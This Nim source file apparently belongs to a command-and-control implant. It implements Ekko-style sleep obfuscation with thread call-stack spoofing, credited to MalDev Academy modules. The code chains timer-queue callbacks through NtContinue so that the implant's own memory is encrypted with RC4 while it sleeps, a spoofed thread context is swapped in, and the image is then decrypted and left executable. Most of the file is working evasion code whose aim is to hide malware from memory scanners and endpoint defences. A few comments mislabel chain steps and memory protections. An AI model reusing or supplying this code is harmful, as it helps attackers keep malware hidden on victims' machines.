import winim/lean
import winim/inc/tlhelp32
import os, strformat
import ../../common/[types, utils, crypto] 

import sugar

# Sleep obfuscation implementation based on Ekko, originally developed by C5pider 
# The code in this file was taken from the MalDev Academy modules 54,56 & 59 and translated from C to Nim
# https://maldevacademy.com/new/modules/54?view=blocks

type 
    USTRING* {.bycopy.} = object 
        Length*: DWORD 
        MaximumLength*: DWORD 
        Buffer*: PVOID

    EVENT_TYPE = enum 
        NotificationEvent, 
        SynchronizationEvent

# Required APIs (definitions taken from NtDoc)
proc RtlCreateTimerQueue*(phTimerQueueHandle: PHANDLE): NTSTATUS {.cdecl, stdcall, importc: protect("RtlCreateTimerQueue"), dynlib: protect("ntdll.dll").}
proc RtlDeleteTimerQueue(hQueue: HANDLE): NTSTATUS {.cdecl, stdcall, importc: protect("RtlDeleteTimerQueue"), dynlib: protect("ntdll.dll").}
proc NtCreateEvent*(phEvent: PHANDLE, desiredAccess: ACCESS_MASK, objectAttributes: POBJECT_ATTRIBUTES, eventType: EVENT_TYPE, initialState: BOOLEAN): NTSTATUS {.cdecl, stdcall, importc: protect("NtCreateEvent"), dynlib: protect("ntdll.dll").}
proc RtlCreateTimer(queue: HANDLE, hTimer: PHANDLE, function: FARPROC, context: PVOID, dueTime: ULONG, period: ULONG, flags: ULONG): NTSTATUS {.cdecl, stdcall, importc: protect("RtlCreateTimer"), dynlib: protect("ntdll.dll").}
proc NtSignalAndWaitForSingleObject(hSignal: HANDLE, hWait: HANDLE, alertable: BOOLEAN, timeout: PLARGE_INTEGER): NTSTATUS {.cdecl, stdcall, importc: protect("NtSignalAndWaitForSingleObject"), dynlib: protect("ntdll.dll").}
proc NtDuplicateObject(hSourceProcess: HANDLE, hSource: HANDLE, hTargetProcess: HANDLE, hTarget: PHANDLE, desiredAccess: ACCESS_MASK, attributes: ULONG, options: ULONG ): NTSTATUS {.cdecl, stdcall, importc: protect("NtDuplicateObject"), dynlib: protect("ntdll.dll").}

# Function for retrieving a random thread's thread context for stack spoofing
proc getRandomThreadCtx(): CONTEXT = 
    
    var 
        ctx: CONTEXT
        hSnapshot: HANDLE
        thd32Entry: THREADENTRY32 
        hThread: HANDLE

    thd32Entry.dwSize = DWORD(sizeof(THREADENTRY32))

    # Create snapshot of all available threads
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
    if hSnapshot == INVALID_HANDLE_VALUE: 
        raise newException(CatchableError, $GetLastError())
    defer: CloseHandle(hSnapshot)

    if Thread32First(hSnapshot, addr thd32Entry) == FALSE: 
        raise newException(CatchableError, $GetLastError())
        
    while Thread32Next(hSnapshot, addr thd32Entry) != 0: 
        # Check if the thread belongs to the current process but is not the current thread
        if thd32Entry.th32OwnerProcessID == GetCurrentProcessId() and thd32Entry.th32ThreadID != GetCurrentThreadId(): 
            
            # Open handle to the thread
            hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, thd32Entry.th32ThreadID)
            if hThread == 0: 
                continue 
            
            # Retrieve thread context
            ctx.ContextFlags = CONTEXT_ALL
            if GetThreadContext(hThread, addr ctx) == 0: 
                continue

            echo protect("[*] Spoofing with call stack of thread "), $thd32Entry.th32ThreadID
            break     

    return ctx

# Ekko sleep obfuscation with stack spoofing 
proc sleepEkko*(sleepDelay: int) = 
    
    var 
        status: NTSTATUS = 0
        key: USTRING = USTRING(Length: 0)
        img: USTRING = USTRING(Length: 0)
        ctx: array[10, CONTEXT]
        ctxInit: CONTEXT
        ctxBackup: CONTEXT
        ctxSpoof: CONTEXT 
        hThread: HANDLE
        hEvent: HANDLE
        hEventStart: HANDLE
        hEventEnd: HANDLE
        queue: HANDLE
        timer: HANDLE 
        value: DWORD = 0
        delay: DWORD = 0
    
    try: 
        var 
            NtContinue = GetProcAddress(GetModuleHandleA(protect("ntdll")), protect("NtContinue"))
            SystemFunction032 = GetProcAddress(LoadLibraryA(protect("Advapi32")), protect("SystemFunction032"))

        # Locate image base and size
        var imageBase = GetModuleHandleA(NULL)
        var imageSize = (cast[PIMAGE_NT_HEADERS](imageBase + (cast[PIMAGE_DOS_HEADER](imageBase)).e_lfanew)).OptionalHeader.SizeOfImage
        # echo fmt"[+] Image base at: 0x{cast[uint64](imageBase).toHex()} ({imageSize} bytes)"
        
        img.Buffer = cast[PVOID](imageBase)
        img.Length = imageSize

        # Generate random encryption key
        var keyBuffer: string = Bytes.toString(generateBytes(Key16)) 
        key.Buffer = keyBuffer.addr
        key.Length = cast[DWORD](keyBuffer.len())

        # Sleep obfuscation implementation using NTAPI
        # Create timer queue
        status = RtlCreateTimerQueue(addr queue) 
        if status != STATUS_SUCCESS:
            raise newException(CatchableError, $status.toHex())
        defer: discard RtlDeleteTimerQueue(queue)

        # Create events
        status = NtCreateEvent(addr hEvent, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)
        if status != STATUS_SUCCESS:
            raise newException(CatchableError, $status.toHex())
        defer: CloseHandle(hEvent)

        status = NtCreateEvent(addr hEventStart, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)
        if status != STATUS_SUCCESS:
            raise newException(CatchableError, $status.toHex())
        defer: CloseHandle(hEventStart)

        status = NtCreateEvent(addr hEventEnd, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)
        if status != STATUS_SUCCESS:
            raise newException(CatchableError, $status.toHex())
        defer: CloseHandle(hEventEnd)

        # Retrieve a random thread context from the current process
        ctxSpoof = getRandomThreadCtx() 

        # Retrieve the initial thread context
        status = RtlCreateTimer(queue, addr timer, RtlCaptureContext, addr ctxInit, 0, 0, WT_EXECUTEINTIMERTHREAD)
        if status != STATUS_SUCCESS: 
            raise newException(CatchableError, $status.toHex())

        # Wait until RtlCaptureContext is successfully completed to prevent a race condition from forming
        status = RtlCreateTimer(queue, addr timer, SetEvent, addr hEvent, 0, 0, WT_EXECUTEINTIMERTHREAD)
        if status != STATUS_SUCCESS:
            raise newException(CatchableError, $status.toHex())

        WaitForSingleObject(hEvent, 1000)

        # Create handle to the current process
        status = NtDuplicateObject(GetCurrentProcess(), GetCurrentThread(), GetCurrentProcess(), addr hThread, THREAD_ALL_ACCESS, 0, 0)
        if status != STATUS_SUCCESS: 
            raise newException(CatchableError, $status.toHex())

        # Preparing the ROP chain 
        # Initially, each element in this array will have the same context as the timer's thread context
        for i in 0 ..< ctx.len(): 
            copyMem(addr ctx[i], addr ctxInit, sizeof(CONTEXT))
            dec(ctx[i].Rsp, 8) # Stack alignment, due to the RSP register being incremented by the size of a pointer
        
        # ROP Chain
        # ctx[0] contains the call to WaitForSingleObjectEx, which waits for a signal to start and execute the rest of the chain.
        ctx[0].Rip = cast[DWORD64](WaitForSingleObjectEx)
        ctx[0].Rcx = cast[DWORD64](hEventStart)
        ctx[0].Rdx = cast[DWORD64](INFINITE)
        ctx[0].R8  = cast[DWORD64](NULL)

        # ctx[1] contains the call to VirtualProtect, which changes the protection of the payload image memory to [RW-]
        ctx[1].Rip = cast[DWORD64](VirtualProtect)
        ctx[1].Rcx = cast[DWORD64](imageBase)
        ctx[1].Rdx = cast[DWORD64](imageSize)
        ctx[1].R8  = cast[DWORD64](PAGE_READWRITE)
        ctx[1].R9  = cast[DWORD64](addr value)

        # ctx[2] contains the call to SystemFunction032, which performs the actual payload memory obfuscation using RC4.
        ctx[2].Rip = cast[DWORD64](SystemFunction032)
        ctx[2].Rcx = cast[DWORD64](addr img)
        ctx[2].Rdx = cast[DWORD64](addr key)

        # Ctx[3] contains the call to GetThreadContext, which retrieves the payload's main thread context and saves it into the CtxBackup variable for later restoration.
        ctxBackup.ContextFlags = CONTEXT_ALL
        ctx[3].Rip = cast[DWORD64](GetThreadContext)
        ctx[3].Rcx = cast[DWORD64](hThread)
        ctx[3].Rdx = cast[DWORD64](addr ctxBackup)

        # Ctx[4] contains the call to SetThreadContext that will spoof the payload thread by setting the thread context with the stolen context.
        ctx[4].Rip = cast[DWORD64](SetThreadContext)
        ctx[4].Rcx = cast[DWORD64](hThread)
        ctx[4].Rdx = cast[DWORD64](addr ctxSpoof)

        # ctx[5] contains the call to WaitForSingleObjectEx, which delays execution and simulates sleeping until the specified timeout is reached. 
        ctx[5].Rip = cast[DWORD64](WaitForSingleObjectEx)
        ctx[5].Rcx = cast[DWORD64](GetCurrentProcess())
        ctx[5].Rdx = cast[DWORD64](cast[DWORD](sleepDelay))
        ctx[5].R8  = cast[DWORD64](FALSE)
        
        # ctx[6] contains the call to SystemFunction032 to decrypt the previously encrypted payload memory
        ctx[6].Rip = cast[DWORD64](SystemFunction032)
        ctx[6].Rcx = cast[DWORD64](addr img)
        ctx[6].Rdx = cast[DWORD64](addr key)

        # Ctx[7] calls SetThreadContext to restore the original thread context from the previously saved CtxBackup.
        ctx[7].Rip = cast[DWORD64](SetThreadContext)
        ctx[7].Rcx = cast[DWORD64](hThread)
        ctx[7].Rdx = cast[DWORD64](addr ctxBackup)

        # ctx[5] contains the call to VirtualProtect to change the payload memory back to [R-X]
        ctx[8].Rip = cast[DWORD64](VirtualProtect)
        ctx[8].Rcx = cast[DWORD64](imageBase)
        ctx[8].Rdx = cast[DWORD64](imageSize)
        ctx[8].R8  = cast[DWORD64](PAGE_EXECUTE_READWRITE)
        ctx[8].R9  = cast[DWORD64](addr value)
        
        # ctx[6] contains the call to the SetEvent WinAPI that will set hEventEnd event object in a signaled state. This with signal that the obfuscation chain is complete
        ctx[9].Rip = cast[DWORD64](SetEvent)
        ctx[9].Rcx = cast[DWORD64](hEventEnd)

        # Executing timers
        for i in 0 ..< ctx.len(): 
            delay += 100
            status = RtlCreateTimer(queue, addr timer, NtContinue, addr ctx[i], delay, 0, WT_EXECUTEINTIMERTHREAD)
            if status != STATUS_SUCCESS: 
                raise newException(CatchableError, $status.toHex())
            
        echo protect("[*] Triggering sleep obfuscation")

        status = NtSignalAndWaitForSingleObject(hEventStart, hEventEnd, FALSE, NULL)
        if status != STATUS_SUCCESS: 
            raise newException(CatchableError, $status.toHex())

    except CatchableError as err: 
        sleep(sleepDelay)
        echo protect("[-] "), err.msg